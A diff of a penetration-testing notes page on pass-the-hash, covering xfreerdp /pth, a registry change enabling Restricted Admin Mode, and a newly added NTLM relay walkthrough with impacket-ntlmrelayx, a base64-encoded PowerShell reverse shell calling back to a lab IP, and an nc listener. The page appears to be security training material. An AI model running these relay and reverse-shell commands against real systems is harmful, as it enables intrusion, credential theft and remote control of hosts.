-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a><span class="c1"># Example:</span>
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a><span class="c1"># xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span>
+<span class="normal"><a href="#__codelineno-10-3">3</a></span>
+<span class="normal"><a href="#__codelineno-10-4">4</a></span>
+<span class="normal"><a href="#__codelineno-10-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>xfreerdp<span class="w"> </span><span class="o">[</span>/d:domain<span class="o">]</span><span class="w"> </span>/u:&lt;username&gt;<span class="w"> </span>/pth:&lt;hash&gt;<span class="w"> </span>/v:<span class="nv">$ip</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="c1"># /pth:&lt;hash&gt;   Pass the hash</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="c1"># Example:</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a><span class="c1"># xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B</span>
 </span></code></pre></div></td></tr></table></div>
 <p><strong>Restricted Admin Mode</strong>, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key <code>DisableRestrictedAdmin</code> (REG_DWORD) under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa</code> with the value of 0. It can be done using the following command:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableRestrictedAdmin</span> <span class="p">/</span><span class="n">d</span> <span class="n">0x0</span> <span class="p">/</span><span class="n">f</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">Lsa</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableRestrictedAdmin</span> <span class="p">/</span><span class="n">d</span> <span class="n">0x0</span> <span class="p">/</span><span class="n">f</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.</p>
+<h2 id="pass-the-hash-to-a-different-machine-ntlm-relay-attack">Pass-the-hash to a different machine: NTLM relay attack</h2>
+<p>If we capture the hash but cannot crack it, then we can try a NTLM relay attack with impacket-ntlmrelayx or Responder MultiRelay.py.</p>
+<p><strong>Step 1</strong>: Set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>cat<span class="w"> </span>/etc/responder/Responder.conf<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">&#39;SMB =&#39;</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>Step 2</strong>: Launch proxy and get SAM database. By default, <code>impacket-ntlmrelayx</code> will dump the SAM database, but we can execute commands by adding the option <code>-c</code>.</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span>
+<span class="normal"><a href="#__codelineno-13-2">2</a></span>
+<span class="normal"><a href="#__codelineno-13-3">3</a></span>
+<span class="normal"><a href="#__codelineno-13-4">4</a></span>
+<span class="normal"><a href="#__codelineno-13-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a><span class="c1"># impacket-ntlmrelayx will dump the SAM database by default</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>impacket-ntlmrelayx<span class="w"> </span>--no-http-server<span class="w"> </span>-smb2support<span class="w"> </span>-t<span class="w"> </span><span class="nv">$ip</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3"></a><span class="c1"># --no-http-server:</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a><span class="c1">#  -smb2support: </span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5"></a><span class="c1"># -t: target machine</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>Step 3</strong>:  Create a PowerShell reverse shell using <a href="https://www.revshells.com/">https://www.revshells.com/</a></p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span>
+<span class="normal"><a href="#__codelineno-14-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="c"># Use option to encode it in base 64</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a><span class="n">powershell</span> <span class="n">-e</span> <span class="n">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>Step 4</strong>: Use the captured hash to launch a reverse shell. Commands in impacket-ntlmrelayx can be executed with flag -c.</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>impacket-ntlmrelayx<span class="w"> </span>--no-http-server<span class="w"> </span>-smb2support<span class="w"> </span>-t<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>Step 5</strong>: Finally, launch a listener. Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a>nc<span class="w">  </span>-lnvp<span class="w"> </span><span class="m">9002</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="uac-limits-pass-the-hash-for-local-accounts">UAC Limits Pass the Hash for Local Accounts</h2>
 <p>UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy</code> is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.</p>
 <blockquote>
-<p>Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account. ´</p>
+<p>Note: There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account. </p>
 </blockquote>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="April 24, 2025 18:41:39 UTC"><span class="timeago" datetime="2025-04-24T18:41:39+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="April 24, 2025 18:41:39 UTC">2025-04-24</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="January 25, 2026 14:34:21 UTC"><span class="timeago" datetime="2026-01-25T14:34:21+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="January 25, 2026 14:34:21 UTC">2026-01-25</span></small></br>
 
 
     <small>Created: August 17, 2023 10:53:26</small>
